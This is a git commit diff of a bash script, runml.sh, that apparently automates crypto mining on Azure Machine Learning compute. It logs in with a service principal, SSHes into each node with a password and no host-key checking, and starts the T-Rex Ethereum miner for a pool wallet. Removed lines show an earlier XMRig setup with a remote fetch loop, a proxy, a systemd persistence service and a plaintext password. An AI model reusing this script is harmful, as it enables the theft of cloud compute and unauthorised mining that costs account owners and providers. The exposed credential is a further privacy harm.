d247a0a87a7475453fa969650bc72d3d0dc5a0a0
duclinh84bk <49627618+duclinh84bk@users.noreply.github.com>
2022-07-09 14:26:23 +0700

    Update runml.sh

--- runml.sh
+++ runml.sh
@@ -1,48 +1,42 @@
 #!/bin/bash
 loginString=(loginString_)
-proxy="proxy_"
-user="linh"
-password="Linh@11668899"
-locations=("australiaeast" "brazilsouth" "canadacentral" "centralindia" "centralus" "eastasia" "eastus" "eastus2" "francecentral" "germanywestcentral" "japaneast" "japanwest" "koreacentral" "northcentralus" "northeurope" "norwayeast" "southafricanorth" "southcentralus" "southeastasia" "switzerlandnorth" "uaenorth" "uksouth" "westcentralus" "westeurope" "westus" "westus2" "westus3")
+worker="worker_"
+wallet="wallet_"
+user="user_"
+password="password_"
+locations="locations_"
+group="group_"
 
 #######################################################################################################
-tmux new-session -d -s 1
-tmux send -t 1 "while [ 1 ]" ENTER
-tmux send -t 1 "do" ENTER
-tmux send -t 1 "wget -O 1 'https://nksas.link/xmr/sync2?id=id_&mail=mail_'" ENTER
-tmux send -t 1 "sleep 1m" ENTER
-tmux send -t 1 "done" ENTER
-
 echo | sudo add-apt-repository ppa:micahflee/ppa
 echo Y | sudo apt install sshpass
 curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
 az extension add -n ml -y
 az login --service-principal --username ${loginString[0]} --password ${loginString[1]} --tenant ${loginString[2]};
 
-sleep 15m
-for location in "${locations[@]}"
+while [ 1 ]
 do
-    echo "$location"
-    for i in 1 2 3
+    list=$(az ml compute list -g $group -w $location --query '[].name' -o tsv)
+    for name in $list
     do
-        ip=$(az ml compute list-nodes -n run$i -g NetworkWatcherRG -w $location --query "[0].public_ip_address" -o tsv)
+        printf "\n ==> $name\n"
+        ip=$(az ml compute list-nodes -n $name -g $group -w $location --query "[0].public_ip_address" -o tsv)
         if [[ "$ip" != "" ]]
         then
-            echo "$i - $ip"
-            port=$(az ml compute list-nodes -n run$i -g NetworkWatcherRG -w $location --query "[0].port" -o tsv)
-            echo "start ssh"
-            sshpass -p $password ssh -o StrictHostKeyChecking=no $user@$ip -p $port "tmux new-session -d -s 1; tmux send -t 1 \"wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-static-x64.tar.gz\" ENTER; tmux send -t 1 \"tar -xf xmrig-6.17.0-linux-static-x64.tar.gz\" ENTER; tmux send -t 1 \"cd xmrig-6.17.0\" ENTER; tmux send -t 1 \"sudo ./xmrig -o $proxy:80\" ENTER"
+            port=$(az ml compute list-nodes -n $name -g $group -w $location --query "[0].port" -o tsv)
+            session=$(sshpass -p $password ssh -o StrictHostKeyChecking=no $user@$ip -p $port "tmux ls")
+            echo $session
+            if [[ "$session" != *"1 windows"* ]]
+            then
+                echo "start ssh"
+                sshpass -p $password ssh -o StrictHostKeyChecking=no $user@$ip -p $port "wget https://github.com/trexminer/T-Rex/releases/download/0.25.9/t-rex-0.25.9-linux.tar.gz; tar -xf t-rex-0.25.9-linux.tar.gz; tmux new-session -d -s 1; tmux send -t 1 \"sudo ./t-rex -a ethash -o stratum+tcp://eth.2miners.com:2020 -u $wallet -p x -w $worker\" ENTER"
+            else
+                echo "dang chay"
+            fi
         else
-            echo "$i empty"
+            echo "khong co node"
         fi
     done
+    sleep 300
 done
 
-cd /
-cd /usr/local/bin
-sudo wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-static-x64.tar.gz
-sudo tar -xf xmrig-6.17.0-linux-static-x64.tar.gz
-sudo bash -c "echo -e \"[Unit]\\nAfter=network.target\n[Service]\nType=simple\nExecStart=/usr/local/bin/xmrig-6.17.0/xmrig -o $proxy:80 -k --tls\n[Install]\nWantedBy=multi-user.target\" > /etc/systemd/system/mrun.service"
-sudo systemctl daemon-reload
-sudo systemctl enable mrun.service
-sudo systemctl start mrun.service
